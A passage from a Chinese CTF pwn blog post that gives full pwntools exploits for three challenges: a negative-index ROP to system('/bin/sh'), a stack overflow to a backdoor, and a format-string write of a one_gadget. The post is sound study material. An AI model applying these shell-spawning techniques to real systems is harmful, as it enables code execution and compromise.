<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Ld1ng">



    <meta name="description" content="Ld1ng's Blog">


    <meta name="keywords" content="CTF,code,CUMT">


<title>PWN记录_2022 | Ld1ng</title>



    <link rel="icon" href="/favicon.ico">



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    




    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.0.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">PWN记录_2022</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">December 14, 2022</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/PWN/">PWN</a>
                            
                        </span>
                    
                     
    <span class="post-count">
Words:
    <a href="">7k</a>  
    </span>


    <span class="post-count">
Time:
    <a href="">36min</a>  
    </span>

                </div>
            
        </header>

        <div class="post-content">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>决定考研之后几乎就没做过题了，，已经回归菜鸡水平，</p>
<p>希望读研之后能抽空做一做pwn，这篇博客用来记录研究生之后做的题目，，</p>
<h2 id="0x00-MTCTF-note"><a href="#0x00-MTCTF-note" class="headerlink" title="0x00 MTCTF note"></a>0x00 MTCTF note</h2><p>libc-2.31 编辑时，idx可以输入负数，通过非法索引修改到栈的返回地址为system</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_4014B6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = input();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">16</span> || !*(_QWORD *)(<span class="number">16LL</span> * idx + a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not allowed&quot;</span>);</span><br><span class="line">  buf = *(<span class="keyword">void</span> **)(<span class="number">16LL</span> * idx + a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, *(<span class="keyword">int</span> *)(<span class="number">16LL</span> * idx + a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>泄露libc基址，先free7个tcache，free一个unsortedbin，再申请一个小堆块分割unsortedbin，产生last_remainder，在小堆块中残留了libc地址可以打印。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5. leave&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5. leave&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5. leave&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5. leave&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1ecc61</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;systme:&quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">og = libc_base + <span class="number">0xe3b34</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017b3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"><span class="comment"># rop = p64(0xdeadbeef) + p64(og)</span></span><br><span class="line">rop = p64(<span class="number">0</span>) + p64(ret) +p64(pop_rdi) + p64(bin_sh)  + p64(system)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(-<span class="number">4</span>,rop)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x01-MTCTF-捉迷藏"><a href="#0x01-MTCTF-捉迷藏" class="headerlink" title="0x01 MTCTF 捉迷藏"></a>0x01 MTCTF 捉迷藏</h2><p>libc-2.27 大量混淆数据，90%没用，重点观察栈中最后一个变量v345，找到相应的循环体</p>
<p><img src="https://files.catbox.moe/kryyp2.png" alt="image-20221112164039689"></p>
<p>逐层向上找，逆出题目逻辑，最后通过栈溢出覆盖返回地址。</p>
<p>特别记录的一点是，  IDA中如下的代码，HIBYTE(), LOBYTE()的含义似乎有歧义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HIBYTE(v95) ^= <span class="number">0x38</span>u;</span><br><span class="line">LOBYTE(v98) = v98 ^ <span class="number">0xC6</span>;</span><br></pre></td></tr></table></figure>

<p>IDA中汇编是<code>mov byte ptr [rbp+var_374+3], al</code>，即取v95的最高位字节，LOBYTE()即取最低字节，而C/C++中并非如此，test.cpp如下，不知是IDA的反编译问题还是…</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// i = 10241035(0x009c440b)</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">10241035</span>;</span><br><span class="line">	WORD ih = <span class="built_in">HIWORD</span>(i);	<span class="comment">// 取高16位</span></span><br><span class="line">	WORD il = <span class="built_in">LOWORD</span>(i);	<span class="comment">// 取低16位</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// result: 9c</span></span><br><span class="line">	std::cout &lt;&lt; std::hex &lt;&lt; <span class="string">&quot;ih: &quot;</span> &lt;&lt; ih &lt;&lt; std::endl;</span><br><span class="line">	<span class="comment">// result: 440b</span></span><br><span class="line">	std::cout &lt;&lt; std::hex &lt;&lt; <span class="string">&quot;il: &quot;</span> &lt;&lt; il &lt;&lt; std::endl;</span><br><span class="line">	</span><br><span class="line">	WORD bh = <span class="built_in">HIBYTE</span>(i);	<span class="comment">// 取高8位</span></span><br><span class="line">	WORD bl = <span class="built_in">LOBYTE</span>(i);	<span class="comment">// 取低8位</span></span><br><span class="line">	<span class="comment">// result: 44</span></span><br><span class="line">	std::cout &lt;&lt; std::hex &lt;&lt; <span class="string">&quot;ih: &quot;</span> &lt;&lt; bh &lt;&lt; std::endl;</span><br><span class="line">	<span class="comment">// result: b</span></span><br><span class="line">	std::cout &lt;&lt; std::hex &lt;&lt; <span class="string">&quot;il: &quot;</span> &lt;&lt; bl &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">    ret = <span class="string">&quot;&quot;</span></span><br><span class="line">    v104 = [<span class="number">0</span>] * <span class="number">42</span></span><br><span class="line">    z = <span class="string">&quot;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&quot;</span></span><br><span class="line">    v104[<span class="number">40</span>] = <span class="number">0x19</span></span><br><span class="line">    v104[<span class="number">32</span>] = <span class="number">0x92</span></span><br><span class="line">    v104[<span class="number">14</span>] = <span class="number">0xA4</span></span><br><span class="line">    v104[<span class="number">22</span>] = <span class="number">0xE6</span></span><br><span class="line">    v104[<span class="number">17</span>] = <span class="number">0x9A</span></span><br><span class="line">    v104[<span class="number">1</span>] = <span class="number">0x7F</span></span><br><span class="line">    v104[<span class="number">38</span>] = <span class="number">0x15</span></span><br><span class="line">    v104[<span class="number">0</span>] = <span class="number">0x3C</span></span><br><span class="line">    v104[<span class="number">31</span>] = <span class="number">0x34</span></span><br><span class="line">    v104[<span class="number">30</span>] = <span class="number">0x2B</span></span><br><span class="line">    v104[<span class="number">10</span>] = <span class="number">0x89</span></span><br><span class="line">    v104[<span class="number">26</span>] = <span class="number">0x98</span></span><br><span class="line">    v104[<span class="number">23</span>] = <span class="number">0xC6</span></span><br><span class="line">    v104[<span class="number">21</span>] = <span class="number">0x68</span></span><br><span class="line">    v104[<span class="number">34</span>] = <span class="number">0x8F</span></span><br><span class="line">    v104[<span class="number">25</span>] = <span class="number">0x5C</span></span><br><span class="line">    v104[<span class="number">12</span>] = <span class="number">0x5C</span></span><br><span class="line">    v104[<span class="number">27</span>] = <span class="number">0xEB</span></span><br><span class="line">    v104[<span class="number">35</span>] = <span class="number">0x42</span></span><br><span class="line">    v104[<span class="number">41</span>] = <span class="number">0xCC</span></span><br><span class="line">    v104[<span class="number">6</span>] = <span class="number">0x49</span></span><br><span class="line">    v104[<span class="number">16</span>] = <span class="number">0xA8</span></span><br><span class="line">    v104[<span class="number">7</span>] = <span class="number">0xA6</span></span><br><span class="line">    v104[<span class="number">29</span>] = <span class="number">0x4E</span></span><br><span class="line">    v104[<span class="number">3</span>] = <span class="number">0xE2</span></span><br><span class="line">    v104[<span class="number">13</span>] = <span class="number">0x31</span></span><br><span class="line">    v104[<span class="number">36</span>] = <span class="number">0x86</span></span><br><span class="line">    v104[<span class="number">11</span>] = <span class="number">0xA7</span></span><br><span class="line">    v104[<span class="number">18</span>] = <span class="number">0x75</span></span><br><span class="line">    v104[<span class="number">5</span>] = <span class="number">1</span></span><br><span class="line">    v104[<span class="number">39</span>] = <span class="number">0xC5</span></span><br><span class="line">    v104[<span class="number">9</span>] = <span class="number">0x93</span></span><br><span class="line">    v104[<span class="number">15</span>] = <span class="number">0x38</span></span><br><span class="line">    v104[<span class="number">24</span>] = <span class="number">0xC6</span></span><br><span class="line">    v104[<span class="number">2</span>] = <span class="number">0xFC</span></span><br><span class="line">    v104[<span class="number">20</span>] = <span class="number">0xC5</span></span><br><span class="line">    v104[<span class="number">19</span>] = <span class="number">0x23</span></span><br><span class="line">    v104[<span class="number">37</span>] = <span class="number">0xEB</span></span><br><span class="line">    v104[<span class="number">28</span>] = <span class="number">0xE0</span></span><br><span class="line">    v104[<span class="number">33</span>] = <span class="number">0x51</span></span><br><span class="line">    v104[<span class="number">4</span>] = <span class="number">0x59</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">            ret += <span class="built_in">chr</span>(v104[i] ^ <span class="built_in">ord</span>(z[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;sbAmJLMLWm&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    sd(<span class="string">&quot;1 &quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;HuEqdjYtuWo&#x27;</span>)</span><br><span class="line">sd(<span class="string">&quot;1&quot;</span>*<span class="number">51</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;hbsoMdIRWpYRqvfClb&quot;</span>)</span><br><span class="line">sd(<span class="string">&quot;1&quot;</span>*<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;tfAxpqDQuTCyJw&quot;</span>)</span><br><span class="line">sd(<span class="string">&quot;1&quot;</span>*<span class="number">34</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;UTxqmFvmLy&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sd(<span class="string">&quot;1 &quot;</span>)</span><br><span class="line">sd(<span class="string">&quot;9254 &quot;</span>)</span><br><span class="line">sd(<span class="string">&quot;0 &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sd(<span class="string">&quot;1 &quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;LLQPyLAOGJbnm&quot;</span>)</span><br><span class="line">sd(f())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;gRGKqIlcuj&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x40132C</span></span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">0x17</span> +p64(backdoor) +p64(backdoor) + <span class="string">b&quot;1&quot;</span> * (<span class="number">55</span> - <span class="number">0x17</span> - <span class="number">8</span>-<span class="number">8</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-DASCTF2209-cyberprinter"><a href="#0x02-DASCTF2209-cyberprinter" class="headerlink" title="0x02 DASCTF2209 cyberprinter"></a>0x02 DASCTF2209 cyberprinter</h2><p>libc-2.31 保护全开，通过栈溢出可以泄露出libc基址，难点在于格式化字符串的利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strchr</span>(s, <span class="string">&#x27;p&#x27;</span>) || <span class="built_in">strchr</span>(s, <span class="string">&#x27;P&#x27;</span>) || <span class="built_in">strchr</span>(s, <span class="string">&#x27;x&#x27;</span>) || <span class="built_in">strchr</span>(s, <span class="string">&#x27;X&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;bad luck&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nWhen you left,hope you can go wherever you want!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>一次fmtstr漏洞的利用，进行地址任意写，无法修改got表，只能寻找libc中可用可修改的函数。</p>
<p>先说本地测试成功的是修改__strlen_avx2()的libc中的got，首先进入puts函数，</p>
<p><img src="https://files.catbox.moe/3e24eo.png" alt="image-20221110210222122"></p>
<p>发现call *ABC*+0x9f630@plt，继续步入发现__strlen_avx2()，也就是说修改其指针指向onegadget，即可getshell</p>
<p><img src="https://files.catbox.moe/qyk5x7.png" alt="image-20221110210349569"></p>
<p>在libc-2.31.so找到puts函数，可以找到plt和got的偏移，构造payload即可。</p>
<p><img src="https://files.catbox.moe/odbnxn.png" alt="image-20220920225653497.png"></p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line">sla(<span class="string">&quot;name?pls..&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">23</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1ed5c0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># start_main = libc_base + 0x21c87</span></span><br><span class="line">og = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + og[<span class="number">1</span>]</span><br><span class="line">libc_atexit = libc_base + <span class="number">0x01E8898</span></span><br><span class="line">rtld = libc_base + <span class="number">0x22cf68</span></span><br><span class="line">strlen = libc_base + <span class="number">0x1EC0A8</span></span><br><span class="line">tar = rtld</span><br><span class="line">info(<span class="string">&quot;target: &quot;</span> + <span class="built_in">hex</span>(tar))</span><br><span class="line">info(<span class="string">&quot;one: &quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">written_size = <span class="number">0</span></span><br><span class="line">offset = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    size = (one_gadget&gt;&gt;(<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span>(size &gt; (written_size &amp; <span class="number">0xff</span>)):</span><br><span class="line">        payload += <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(size-(written_size&amp;<span class="number">0xff</span>),offset+i).encode()</span><br><span class="line">        written_size += size - (written_size &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x100</span>-(written_size&amp;<span class="number">0xff</span>))+size,offset+i).encode()</span><br><span class="line">        written_size += (<span class="number">0x100</span> - (written_size&amp;<span class="number">0xff</span>)) + size</span><br><span class="line"></span><br><span class="line">payload=payload.ljust(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    payload += p64(tar+i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">sa(<span class="string">&quot;so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>两次失败的是尝试修改__libc_atexit和rtld_lock_default_lock_recursive</p>
<p>rtld_lock_default_lock_recursive，其定义于sysdeps/nptl/libc-lockP.h中，如下：</p>
